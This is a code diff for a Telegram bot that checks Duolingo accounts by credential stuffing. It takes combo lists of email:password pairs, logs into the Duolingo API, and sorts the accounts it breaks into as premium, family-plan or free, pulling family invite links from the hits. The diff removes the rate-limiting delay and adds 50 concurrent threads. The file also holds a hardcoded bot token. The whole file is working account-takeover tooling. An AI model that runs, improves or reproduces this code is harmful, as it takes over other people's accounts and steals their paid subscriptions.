@@ -6,10 +6,12 @@ import uuid
 import logging
 import threading
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
 ADMIN_ID = 8770379893
+MAX_THREADS = 50  # Thread 50 ပုံသေ
 # ===================================
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
@@ -55,37 +57,27 @@ def get_error_type(exception):
         return f"❌ {str(exception)[:30]}"
 
 def is_premium_account(data):
-    """
-    Premium detection - Super နဲ့ Family ခွဲပါတယ်
-    """
-    
-    # Check for FAMILY PLAN first
     shop_items = data.get("shopItems", [])
     for item in shop_items:
         family_info = item.get("familyPlanInfo", {})
         if family_info and family_info.get("inviteToken"):
             return True, "FAMILY", family_info.get("inviteToken")
     
-    # Check for SUPER PREMIUM
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
         if sub_info:
             product_id = sub_info.get("productId", "")
-            # Skip free trial
             if "trial" in product_id.lower():
                 continue
             if product_id and product_id != "N/A":
                 return True, "SUPER", None
     
-    # Check has_item_premium_subscription
     if data.get("has_item_premium_subscription") == True:
         return True, "SUPER", None
     
-    # Check hasPlus
     if data.get("hasPlus") == True:
         return True, "SUPER", None
     
-    # Check subscriptionConfigs
     sub_configs = data.get("subscriptionConfigs", [])
     for sub in sub_configs:
         if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
@@ -94,8 +86,6 @@ def is_premium_account(data):
     return False, "FREE", None
 
 def extract_subscription_details(data, plan_type):
-    """Extract subscription details"""
-    
     details = {
         "product_id": "Unknown",
         "renewing": "Unknown",
@@ -121,12 +111,13 @@ def extract_subscription_details(data, plan_type):
     
     return details
 
-def check_duolingo(email, password):
+def check_single_account(email, password):
+    """Single account check - for threading"""
     session = requests.Session()
     ua = generate_ua()
     
     try:
-        # STEP 1: Login
+        # Login
         login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
         distinct_id = str(uuid.uuid4())
         
@@ -142,14 +133,14 @@ def check_duolingo(email, password):
         resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
         
         if resp.status_code != 200:
-            return "FAIL", "wrong credentials", None
+            return email, password, "FAIL", "wrong credentials", None
         
         login_data = resp.json()
         user_id = login_data.get("id")
         if not user_id:
-            return "FAIL", "no user id", None
+            return email, password, "FAIL", "no user id", None
         
-        # STEP 2: Get JWT from cookies
+        # Get JWT
         jwt_token = None
         for cookie in session.cookies:
             if cookie.name == "jwt_token":
@@ -157,46 +148,43 @@ def check_duolingo(email, password):
                 break
         
         if not jwt_token:
-            return "FAIL", "no jwt token", None
+            return email, password, "FAIL", "no jwt token", None
         
-        # STEP 3: Get full profile
-        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt%2Ccourses%7Btitle%2Cid%2ClearningLanguage%2CfromLanguage%2Cxp%2Ccrowns%7D"
+        # Get profile
+        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt"
         
         profile_headers = get_headers(ua, jwt_token)
         
         resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
         
         if resp2.status_code != 200:
-            return "FAIL", f"profile error {resp2.status_code}", None
+            return email, password, "FAIL", f"profile error {resp2.status_code}", None
         
         data = resp2.json()
         
         # Extract basic info
         username = data.get("username", "N/A")
         total_xp = data.get("totalXp", 0)
-        gems = data.get("gemsConfig", {}).get("gems", 0) if data.get("gemsConfig") else 0
         streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
         learning_lang = data.get("learningLanguage", "N/A")
         from_lang = data.get("fromLanguage", "N/A")
         created_at = data.get("createdAt", "Unknown")
         
-        # Check premium and plan type
+        # Check premium
         is_premium, plan_type, invite_token = is_premium_account(data)
         
-        # FREE account
         if not is_premium:
-            free_result = f"⚠️ FREE | {email}:{password} | {username} | XP:{total_xp} | Streak:{streak}"
-            return "FREE", free_result, None
+            return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None
         
         # Get subscription details
         sub_details = extract_subscription_details(data, plan_type)
         if invite_token:
             sub_details["invite_token"] = invite_token
         
-        # Build HIT result based on plan type
+        # Build result
         if plan_type == "FAMILY":
             result = f"""
-👨‍👩‍👧 **FAMILY PREMIUM HIT!** 👨‍👩‍👧
+👨‍👩‍👧 **FAMILY PREMIUM HIT!**
 
 📊 **ACCOUNT:**
 ├─ Email: `{email}:{password}`
@@ -206,20 +194,18 @@ def check_duolingo(email, password):
 ├─ Learning: `{learning_lang}` (from `{from_lang}`)
 └─ Plan: 👨‍👩‍👧 **FAMILY PLAN**
 
-💎 **SUBSCRIPTION DETAILS:**
-├─ Product ID: `{sub_details['product_id']}`
-├─ Auto-Renew: `{sub_details['renewing']}`
+💎 **SUBSCRIPTION:**
+├─ Product: `{sub_details['product_id']}`
+├─ Renew: `{sub_details['renewing']}`
 └─ Expires: `{sub_details['expiry']}`
 
-📅 Account created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
+📅 Created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
 """
             if sub_details["invite_token"]:
-                invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
-                result += f"\n🔗 **FAMILY INVITE LINK:**\n`{invite_link}`"
-        
-        else:  # SUPER PREMIUM
+                result += f"\n🔗 **INVITE LINK:**\nhttps://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
+        else:
             result = f"""
-👑 **SUPER PREMIUM HIT!** 👑
+👑 **SUPER PREMIUM HIT!**
 
 📊 **ACCOUNT:**
 ├─ Email: `{email}:{password}`
@@ -229,24 +215,24 @@ def check_duolingo(email, password):
 ├─ Learning: `{learning_lang}` (from `{from_lang}`)
 └─ Plan: 👑 **SUPER PREMIUM**
 
-💎 **SUBSCRIPTION DETAILS:**
-├─ Product ID: `{sub_details['product_id']}`
-├─ Auto-Renew: `{sub_details['renewing']}`
+💎 **SUBSCRIPTION:**
+├─ Product: `{sub_details['product_id']}`
+├─ Renew: `{sub_details['renewing']}`
 └─ Expires: `{sub_details['expiry']}`
 
-📅 Account created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
+📅 Created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
 """
         
         result += f"\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
         
-        return "HIT", result, plan_type
+        return email, password, "HIT", result, plan_type
         
     except requests.exceptions.Timeout:
-        return "ERROR", "Timeout", None
+        return email, password, "ERROR", "Timeout", None
     except requests.exceptions.ConnectionError:
-        return "ERROR", "Connection Error", None
+        return email, password, "ERROR", "Connection Error", None
     except Exception as e:
-        return "ERROR", str(e)[:50], None
+        return email, password, "ERROR", str(e)[:50], None
 
 def make_progress_bar(percent, width=20):
     filled = int(width * percent / 100)
@@ -272,50 +258,85 @@ def process_combos(chat_id, combos, message_id):
     family_hits = []
     free_accounts = []
     
-    for i, (email, pwd) in enumerate(combos):
-        if stop_flag:
-            bot.send_message(chat_id, "🛑 **Stopped by user.**", parse_mode="Markdown")
-            break
+    completed = 0
+    results = {}
+    
+    # Send initial progress
+    progress_text = f"""
+╔════════════════════════════════════╗
+║     🦉 DUOLINGO CHECKER            ║
+║     BY ThuYa V3                    ║
+╚════════════════════════════════════╝
+
+⏱️ **Time:** `0.0s`
+
+`[░░░░░░░░░░░░░░░░░░░░] 0.0%`
+📍 **Checked:** `0/{total}`
+🚀 **Threads:** `{MAX_THREADS}`
+
+┌────────────────────────────────────┐
+│ 📊 RESULTS SUMMARY                 │
+├────────────────────────────────────┤
+│ 👑 SUPER PREMIUM   :  `0`          │
+│ 👨‍👩‍👧 FAMILY PLAN   :  `0`          │
+│ ⚠️ FREE ACCOUNT    :  `0`          │
+│ ❌ WRONG PASS      :  `0`          │
+│ 🔴 NETWORK ERROR   :  `0`          │
+└────────────────────────────────────┘
+
+_Use /stop to cancel_
+"""
+    try:
+        bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
+    except:
+        pass
+    
+    # Thread pool execution
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
         
-        current = i + 1
-        percent = (current / total) * 100
-        elapsed = time.time() - start_time
-        
-        short_email = email[:25] + "..." if len(email) > 28 else email
-        
-        status, detail, plan_type = check_duolingo(email, pwd)
-        
-        if status == "HIT":
-            if plan_type == "FAMILY":
-                family_count += 1
-                family_hits.append((email, pwd, detail))
+        for future in as_completed(futures):
+            if stop_flag:
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
+            
+            email, password, status, detail, plan_type = future.result()
+            completed += 1
+            percent = (completed / total) * 100
+            elapsed = time.time() - start_time
+            
+            if status == "HIT":
+                if plan_type == "FAMILY":
+                    family_count += 1
+                    family_hits.append((email, password, detail))
+                else:
+                    super_count += 1
+                    super_hits.append((email, password, detail))
+                # Send HIT immediately
+                bot.send_message(chat_id, detail, parse_mode="Markdown")
+                logging.info(f"✅ {plan_type} HIT: {email}")
+            elif status == "FREE":
+                free_count += 1
+                free_accounts.append((email, password, detail))
+                logging.info(f"⚠️ FREE: {email}")
+            elif status == "ERROR":
+                error_count += 1
+                error_types[detail] = error_types.get(detail, 0) + 1
+                logging.info(f"🔴 ERROR: {email} - {detail}")
             else:
-                super_count += 1
-                super_hits.append((email, pwd, detail))
-            bot.send_message(chat_id, detail, parse_mode="Markdown")
-            logging.info(f"✅ {plan_type} HIT: {email}")
-        elif status == "FREE":
-            free_count += 1
-            free_accounts.append((email, pwd, detail))
-            logging.info(f"⚠️ FREE: {email}")
-        elif status == "ERROR":
-            error_count += 1
-            error_types[detail] = error_types.get(detail, 0) + 1
-            logging.info(f"🔴 ERROR: {email} - {detail}")
-        else:
-            fail_count += 1
-            logging.info(f"❌ FAIL: {email}")
-        
-        # Update progress every 5 combos
-        if current % 5 == 0 or current == total or stop_flag:
-            progress_bar = make_progress_bar(percent)
+                fail_count += 1
+                logging.info(f"❌ FAIL: {email}")
             
-            error_summary = ""
-            if error_types:
-                err_list = list(error_types.items())[:2]
-                error_summary = "\n".join([f"   ├─ {k}: {v}" for k, v in err_list])
-            
-            progress_text = f"""
+            # Update progress every 10 completions
+            if completed % 10 == 0 or completed == total:
+                progress_bar = make_progress_bar(percent)
+                
+                error_summary = ""
+                if error_types:
+                    err_list = list(error_types.items())[:2]
+                    error_summary = "\n".join([f"   ├─ {k}: {v}" for k, v in err_list])
+                
+                progress_text = f"""
 ╔════════════════════════════════════╗
 ║     🦉 DUOLINGO CHECKER            ║
 ║     BY ThuYa V3                    ║
@@ -324,7 +345,8 @@ def process_combos(chat_id, combos, message_id):
 ⏱️ **Time:** `{elapsed:.1f}s`
 
 `{progress_bar}`
-📍 **Checked:** `{current}/{total}`
+📍 **Checked:** `{completed}/{total}`
+🚀 **Threads:** `{MAX_THREADS}`
 
 ┌────────────────────────────────────┐
 │ 📊 RESULTS SUMMARY                 │
@@ -336,17 +358,15 @@ def process_combos(chat_id, combos, message_id):
 │ 🔴 NETWORK ERROR   :  `{error_count}`    │
 └────────────────────────────────────┘
 """
-            if error_summary:
-                progress_text += f"\n🔍 **Errors:**\n{error_summary}"
-            
-            progress_text += f"\n\n📧 **Now:** `{short_email}`\n\n_Use /stop to cancel_"
-            
-            try:
-                bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
-            except:
-                pass
-        
-        time.sleep(1.5)
+                if error_summary:
+                    progress_text += f"\n🔍 **Errors:**\n{error_summary}"
+                
+                progress_text += "\n\n_Use /stop to cancel_"
+                
+                try:
+                    bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
+                except:
+                    pass
     
     elapsed = time.time() - start_time
     progress_bar = make_progress_bar(100)
@@ -361,6 +381,7 @@ def process_combos(chat_id, combos, message_id):
 
 `{progress_bar}`
 📍 **Checked:** `{total}/{total}`
+🚀 **Threads:** `{MAX_THREADS}`
 
 ┌────────────────────────────────────┐
 │ 📊 FINAL RESULTS                   │
@@ -376,9 +397,9 @@ def process_combos(chat_id, combos, message_id):
 """
     bot.send_message(chat_id, final_summary, parse_mode="Markdown")
     
-    # Send super hits file
+    # Send premium hits file
     if super_hits or family_hits:
-        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Super Premium: {len(super_hits)} | Family Plan: {len(family_hits)}\n\n"
+        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Super Premium: {len(super_hits)} | Family Plan: {len(family_hits)}\n# Threads: {MAX_THREADS}\n\n"
         
         if super_hits:
             hit_content += "="*60 + "\n"
@@ -431,7 +452,8 @@ def start_command(message):
         message,
         "👋 **Duolingo Premium Account Checker**\n\n"
         "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
-        "**Author:** @thuyaaungzaw\n\n"
+        "**Author:** @thuyaaungzaw\n"
+        f"**Threads:** `{MAX_THREADS}` (Concurrent)\n\n"
         "📂 Click button below → Send combo file (email:pass)\n\n"
         "**Results:**\n"
         "👑 **SUPER PREMIUM** → Individual premium plan\n"
@@ -499,5 +521,6 @@ def handle_file(message):
 print("🤖 Duolingo Premium Checker Bot is running...")
 print("Config: [ DUOLINGO ] BY ThuYa V3")
 print("Author: @thuyaaungzaw")
+print(f"Threads: {MAX_THREADS} (Concurrent)")
 print("Features: SUPER PREMIUM | FAMILY PLAN | Progress Bar | /stop")
 bot.infinity_polling()
